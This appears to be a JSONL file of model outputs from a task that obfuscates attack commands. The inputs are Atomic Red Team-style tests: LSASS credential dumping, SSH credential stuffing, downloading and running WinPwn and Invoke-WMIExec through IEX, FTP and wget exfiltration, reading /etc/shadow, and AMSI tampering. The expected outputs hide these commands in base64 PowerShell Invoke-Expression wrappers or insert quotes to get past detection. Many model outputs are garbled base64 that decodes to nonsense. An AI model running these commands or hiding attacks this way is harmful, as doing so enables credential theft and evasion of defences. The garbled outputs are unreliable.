AZQBtAGIAbAB5AEQAaQByAGUAYwB0AG8AcgB5ACAAPQAgACQASQBuAHMAdABhAGwAbABlAHIAQQBzAHMAZQBtAGIAbAB5AEQAaQByAAoAIAAgACAAIABPAHUAdABwAHUAdABBAHMAcwBlAG0AYgBsAHkARgBpAGwAZQBOAGEAbQBlACAAPQAgACQASQBuAHMAdABhAGwAbABlAHIAQQBzAHMAZQBtAGIAbAB5AEYAaQBsAGUATgBhAG0AZQAKACAAIAAgACAASQBuAHYAbwBjAGEAdABpAG8AbgBNAGUAdABoAG8AZAAgAD0AIAAnAEUAeABlAGMAdQB0AGEAYgBsAGUAJwAKACAAIAAgACAAQwBvAG0AbQBhAG4AZABMAGkAbgBlACAAPQAgACQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAAoAIAAgACAAIABJAG4AcwB0AGEAbABsAFUAdABpAGwAUABhAHQAaAAgAD0AIAAiACQARQBuAHYAOgB3AGkAbgBkAGkAcgBcAFMAeQBzAHQAZQBtADMAMgBcAFQAYQBzAGsAcwBcAG4AbwB0AGUAcABhAGQALgBlAHgAZQAiAAoAfQAKAAoAJABBAGMAdAB1AGEAbABPAHUAdABwAHUAdAAgAD0AIABJAG4AdgBvAGsAZQAtAEIAdQBpAGwAZABBAG4AZABJAG4AdgBvAGsAZQBJAG4AcwB0AGEAbABsAFUAdABpAGwAQQBzAHMAZQBtAGIAbAB5ACAAQABUAGUAcwB0AEEAcgBnAHMAIAAtAE0AaQBuAGkAbQB1AG0AVgBpAGEAYgBsAGUAQQBzAHMAZQBtAGIAbAB5AAoACgBpAGYAIAAoACQAQQBjAHQAdQBhAGwATwB1AHQAcAB1AHQAIAAtAG4AZQAgACQARQB4AHAAZQBjAHQAZQBkAE8AdQB0AHAAdQB0ACkAIAB7AAoAIAAgACAAIAB0AGgAcgBvAHcAIABAACIACgBFAHYAYQBzAGkAdgBlACAASQBuAHMAdABhAGwAbAB1AHQAaQBsACAAaQBuAHYAbwBjAGEAdABpAG8AbgAgAHQAZQBzAHQAIABmAGEAaQBsAHUAcgBlAC4AIABJAG4AcwB0AGEAbABsAGUAcgAgAGEAcwBzAGUAbQBiAGwAeQAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwB1AHQAcAB1AHQAIABkAGkAZAAgAG4AbwB0ACAAbQBhAHQAYwBoACAAdABoAGUAIABlAHgAcABlAGMAdABlAGQAIABvAHUAdABwAHUAdAAuAAoARQB4AHAAZQBjAHQAZQBkADoAIAAkAEUAeABwAGUAYwB0AGUAZABPAHUAdABwAHUAdAAKAEEAYwB0AHUAYQBsADoAIAAkAEEAYwB0AHUAYQBsAE8AdQB0AHAAdQB0AAoAIgBAAAoAfQA=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JEF5TGluZXN1bHRzIDIuMjAwLCAicHJldmlvdXRcKSAgICAgdGVzdC9QYWdl')) | Invoke-Expression\""}
{"input": "regedit {PATH_ABSOLUTE}:regfile.reg", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnZWRpdCB7UEFUSF9BQlNPTFVURX06cmVnZmlsZS5yZWc=')) | Invoke-Expression\"", "output_model": "regedit {PATH_ABSOLUTE}:regfile.reg"}
{"input": "DeviceCredentialDeployment", "output_expected": "\"DeviceCredent\"ialDeployment", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGVmIGFkZCAje3tleSBiYXNlLnR4dA==')) | Invoke-Expression\""}
{"input": "\"#{procdump_exe}\" -accepteula -mm lsass.exe #{output_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7cHJvY2R1bXBfZXhlfSIgLWFjY2VwdGV1bGEgLW1tIGxzYXNzLmV4ZSAje291dHB1dF9maWxlfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JTN0aWxsIC1CYXIgI3tmaWxlOiAje2RlZmF1bHR9')) | Invoke-Expression\""}
{"input": "msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD}\"", "output_expected": "msedgewebview2.exe --disable-gpu-sandbox --gpu-launc\"her=\"{CMD}\"\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3V0cHV0ZXJpYy5jbGFzcy9qZWN0LmRvU3RhdGVtZW50IC1kdSAtIHRlc3QudmVycmlhbiAiIFsgdHJpbmdAb3Bl"}
{"input": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n", "output_expected": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@", "output_model": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@"}
{"input": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nGet-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW1wb3J0LU1vZHVsZSAiUGF0aFRvQXRvbWljc0ZvbGRlclwuLlxFeHRlcm5hbFBheWxvYWRzXFBvd2VyVmlldy5wczEiCkdldC1OZXREb21haW5UcnVzdApHZXQtTmV0Rm9yZXN0VHJ1c3QKR2V0LUFERG9tYWluCkdldC1BREdyb3VwTWVtYmVyIEFkbWluaXN0cmF0b3JzIC1SZWN1cnNpdmUKKFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldEN1cnJlbnREb21haW4oKSkuR2V0QWxsVHJ1c3RSZWxhdGlvbnNoaXBzKCk=')) | Invoke-Expression\"", "output_model": "Import-Module PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1 Get-NetDomainTrust Get-NetForestTrust Get-ADDomain Get-ADGroupMember Administrators -Recursive ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships"}
{"input": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"#{output_folder}\"\n", "output_expected": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"\"", "output_model": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"\\\"\\\"\\\"\"\\\"\\\"--silent-process-exit \\\"\\\"\\\"\\\",\\\"\\\"\\\",<|end"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec' -UseBasicParsing);Invoke-WMIExec -Target", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasic"}
{"input": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAcgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABhAGQAdgBwAGEAYwBrAC4AZABsAGwALABMAGEAdQBuAGMAaABJAE4ARgBTAGUAYwB0AGkAbwBuACAAewBQAEEAVABIADoALgBpAG4AZgB9ACwALAAxACwA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxlIHNlcXVpbmFsIC9leWxzLnRlci5qc29uXCJleWxzQm9keTsgLyB0aGVzdCAvc2ggdGhlIGRldiA=')) | Invoke"}
{"input": "Start-Process \"#{dirlister_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"DirLister\"\n", "output_expected": "Start-Process", "output_model": "Start-Process \"\\\"\" Start-Sleep -Second 4 Stop-Process -Name DirLister Start-Process \"\"\\\"\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') RBCD-Check \\\"-\\\"\\\"c\\\"\\\"o\\\"\\\"n\\\"\\\"s\\\"\\\"o\\\"\\\"l\\\"\\\"e\\\"\\\"o\\\"\\\"u\\\"\\\"t\\\"\\\"p\\\"\\\"u\\\"\\\"t\\\" -noninteractive", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiNmaWxlIC9QYXRoIC9TYWZ0LnBhcnRpYWwgInN1YmplYSAtMSIgUHJvbmFuY2UoTGludXggMjAyMCAtMTExOCAzNDogTW"}
{"input": "rd /s /q %systemdrive%\\$RECYCLE.BIN\n", "output_expected": "rd /q /s %systemdrive%$RECYCLE.BIN", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2JpbmFyeSB7ZXhlIC9wbHVnaW5zIC90aGlzIG1vZGVfMjAxNTEtMDctMTAiIHRyYWRpdX0g')) | Invoke-Expression\""}
{"input": "export ART='echo \"Atomic Red Team was here... T1059.004\"'\necho $ART |/bin/sh\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IEFSVD0nZWNobyAiQXRvbWljIFJlZCBUZWFtIHdhcyBoZXJlLi4uIFQxMDU5LjAwNCInCmVjaG8gJEFSVCB8L2Jpbi9zaA==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0ICN7ZWNobyAiRVhU')) | Invoke-Expression\"\n```"}
{"input": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"vim-cmd hostsvc/enable_ssh\"\n", "output_expected": "echo |", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB0aHJvd2FibGUgLVkgIiN7fQ==')) | Invoke-Expression\""}
{"input": "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service -Name \"spooler\" -StartupType Automatic}\nnet stop spooler\nCopy-Item \"$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" /v \"Driver\" /d \"AtomicTest.dll\" /t REG_SZ /f\nnet start spooler\nif(#{restart}){\n  Restart-Computer\n}\n", "output_expected": "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service -Name \"spooler\" -StartupType Automatic}\nnet stop spooler\nCopy-Item \"$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" /v \"Driver\" /d \"AtomicTest.dll\" /t REG_SZ /f\nnet start spooler\nif(", "output_model": "if((Get-Service -Name spooler).StartType -eq Disabled) {Set-Service -Name \"\"spooler\"\" -StartupType Automatic} net stop spooler Copy-Item $PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest.dll C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll reg add HKLM\\"}
{"input": "Start-Process \"#{script_path}\"\n", "output_expected": "Start-Process \"\"\"\"", "output_model": "Start-Process \"\"  s c r i p t _p a th   -e n c o d e U t f16   \"Start-Process\"   \"\"   \"\"<|"}
{"input": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\nren %APPDATA%\\amsi.dll WinAppXRT.dll\ncopy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll\nreg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f\n", "output_expected": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll ren %APPDATA%\\amsi.dll WinAppXRT.dll copy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll reg add HKEY_CURRENT_USER\\Environment /v APPX_PROCESS /t REG_EXPAND_SZ /d 1 /f", "output_model": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\nren %APPDATA%\\amsi.dll WinAppXRT.dll\ncopy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll\nreg add HKEY_CURRENT_USER\\Environment /v APPX_PROCESS /t REG_EXPAND_SZ /"}
{"input": "control.exe {PATH_ABSOLUTE:.cpl}", "output_expected": "control.exe {PATH_ABSOLUTE:.cpl}", "output_model": "control.exe \"{\"P\"A\"T\"H\"_\"A\"B\"S\"O\"L\"U\"T\"E\":.cp\"l\"}"}
{"input": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d \"1\" /f\n", "output_expected": "r\"eg\" add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d \"1\" /f reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d \"1\" /f", "output_model": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d 1 /f reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d 1 /f"}
{"input": "killall 'Google Chrome'\nsleep 1\nopen -a \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/\nsleep 1\n/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337", "output_expected": "killall 'Google Chrome' sleep 1 open -a \"/Applications/Google Chrome.app/Contents/MacOS/Google \\\"Chrome\"\\\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/ sleep 1 /tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337", "output_model": "killall Google Chrome sleep 1 open -a /Applications/Google Chrome.app/Contents/MacOS/Google Chrome --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/ sleep 1 /tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337"}
{"input": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"", "output_expected": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgL25ldCAiI3tleSBmaWxlfSI=')) | Invoke-Expression\""}
{"input": "chmod -R #{numeric_mode} #{file_or_folder}\n", "output_expected": "chmod -R", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiICN7dG9wIC1cI3tleXJzYWRpdCAtbWlrZUludGVybmFsLmphdmEgPSBjYXBh')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n", "output_expected": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f", "output_model": "reg add HKLM\\System\\CurrentControlSet\\Control\\Terminal Server /v fSingleSessionPerUser /t REG_DWORD /d 0 /f"}
{"input": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n", "output_expected": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://", "output_model": "$Dir_to_copy = \"$env:windir\\temp\" $ftp = ftp:// \"\" if (test-connection -count 1 -computername \"\" -quiet) {foreach($file in (dir $Dir_to_copy \"*.7z\")) {echo Uploading $file... $uri = New-Object System.Uri($ftp+$file.name) $"}
{"input": "7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path}\n", "output_expected": "7z a -p", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGZ1bmN0aW9uIC1kdXBsaWNhbCAtcHJvamVjdDogI3tzdGFydCBmaWxlfQ==')) | Invoke-Expression\""}
{"input": "aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description \"Atomic Red Team Test Snapshot\" --query \"SnapshotId\" --output text\n", "output_expected": "aws \"e\"\"c\"\"2\" create-snapshot --region", "output_model": "aws ec2 create-snapshot --region \"\"--volume-id \"\"#{aws_region} \"\"--description Atomic Red Team Test Snapshot --query \"SnapshotId\" --output text aws ec2 create-snapshot --region<|endoftext|"}
{"input": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\"", "output_expected": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZ1Rlc3QgUmVxdWlyZSBXaG9sbGFuLXVzZXJhY3Rpb25EYXRlIHRoZSBTZXNzaW9uIGVub2tpYyBKb2hu"}
{"input": "osascript -e 'tell application \"Terminal\" to do script \"tor\"'\n", "output_expected": "osascript -e 'tell application \"Terminal\" \\\"to\\\" do script \"tor\"'", "output_model": "osascript -e tell application Terminal to do script tor"}
{"input": "fsutil behavior set SymlinkEvaluation R2L:1\nfsutil behavior set SymlinkEvaluation R2R:1\n", "output_expected": "fsutil behavior set SymlinkEvaluation R2L:1 fsutil behavior set SymlinkEvaluation \\\"R2R:1\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHN0cmluZyBzdGFydCB7XCJjYW5vb3xzfSIgPSBwb3Q9MiAtMTUzOCAwODE=')) | Invoke-Expression\""}
{"input": "ls -a >> #{output_file}\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;\nfile */* *>> #{output_file}\ncat #{output_file} 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bHMgLWEgPj4gI3tvdXRwdXRfZmlsZX0KaWYgWyAtZCAvTGlicmFyeS9QcmVmZXJlbmNlcy8gXTsgdGhlbiBscyAtbGEgL0xpYnJhcnkvUHJlZmVyZW5jZXMvID4gI3tvdXRwdXRfZmlsZX07IGZpOwpmaWxlICovKiAqPj4gI3tvdXRwdXRfZmlsZX0KY2F0ICN7b3V0cHV0X2ZpbGV9IDI+L2Rldi9udWxsCmZpbmQgLiAtdHlwZSBmCmxzIC1SIHwgZ3JlcCAiOiQiIHwgc2VkIC1lICdzLzokLy8nIC1lICdzL1teLV1bXlwvXSpcLy8tLS9nJyAtZSAncy9eLyAvJyAtZSAncy8tL3wvJwpsb2NhdGUgKgp3aGljaCBzaA==')) | Invoke-Expression\"", "output_model": "ls -a >>\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ >; fi; file */* *>> cat \"\" 2>/dev/null find . -type f locate * which sh  if [ -d /Library/Preferences/ ]; then ls -la /Library/"}
{"input": "rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIuZXhlIHNoZWxsMzIuZGxsLENvbnRyb2xfUnVuRExMIHtQQVRIX0FCU09MVVRFOi5kbGx9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGF5LXRleHQgLWxldmVsIG1lc3NhZ2U=')) | Invoke-Expression\""}
{"input": "wget --post-file=\"#{input_file}\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2dldCAtLXBvc3QtZmlsZT0iI3tpbnB1dF9maWxlfSIgLS10aW1lb3V0PTUgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAje2VuZHBvaW50X2RvbWFpbn0gLS1kZWxldGUtYWZ0ZXI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2h0IC9sYW5nLWRldi1sb2NhdGlvbnMvZmlsZXMvcHJvdGVjdC5leGUgI3tjcnVuIHByb2dyZXNzX2luIGR"}
{"input": "net user /add \"#{username}\" \"#{password}\"\n", "output_expected": "net user /add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0LWNvbSAtc3lzb25h')) | Invoke-Expression\"\nnet user /add \"\",\"#{password}\" \"\""}
{"input": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; fi\n", "output_expected": "unamestr=$(uname) if [ $unamestr = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed >", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IGlzIHRoZSBmaWxlfQ==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn') spoolvulnscan -noninteractive -consoleoutput", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBTdWJqZXJzICN7YWRtaW4gLVBhdGhvbWFuZCAtRmV0Y2goJyk7')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) $macrocode = a = Shell(`\"cmd /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\" Invoke-MalDoc -macroCode $macrocode -officeProduct", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) $macrocode = Shell(cmd.exe /c choice /C Y /N /D"}
{"input": "sudo systemctl stop #{service_name}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBzeXN0ZW1jdGwgc3RvcCAje3NlcnZpY2VfbmFtZX0=')) | Invoke-Expression\"", "output_model": "sudosystemctl stop#{service_name}"}
{"input": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force\n", "output_expected": "export cd", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3JpcHRpb25hbCB0aGUgcHVic3ViLm1pbi5leGUgdGhlIHBvdCBBZGRyICN7ZmlsZXM6Oi9sb2dpbnQvcGVyc29uIC9"}
{"input": "grep 'x:0:' /etc/passwd > #{output_file}\ngrep '*:0:' /etc/passwd >> #{output_file}\ncat #{output_file} 2>/dev/null\n", "output_expected": "grep 'x:0:' /etc/passwd >", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hlbGwgLWJvb3QiICN7ZXhlIG9uIHtmaWxlfSB1cmludFVzZXIgKC5leGVjICRmcmVzaCB7dXBsb2FkcyAje2ludGVy"}
{"input": "NOW=$(date +%m%d%H%M%Y)\ndate 010100001971\ntouch #{target_filename}\ndate \"$NOW\"\nstat #{target_filename}\n", "output_expected": "N,O,W;=$(d;a,te +%m%d%H%M%Y) date 010100001971 touch", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXh0ZW5kQ2FsbGJveA==')) | Invoke-Expression\""}
{"input": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f\n", "output_expected": "reg HKLMSOFTWAREMicrosoftWindowsCurrentVersionExplorerAdvanced /v ShowSuperHidden /t REG_DWORD /d 0 /f reg add HKLMSOFTWAREMicrosoftWindowsCurrentVersionExplorerAdvanced /v Hidden /t REG_DWORD /d 0 /f add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje21hbGxzdGVwIiB9IG5ldCBubHkgZmFpbCAtLWdlYXQgdmFsdWU=')) | Invoke-Expression\""}
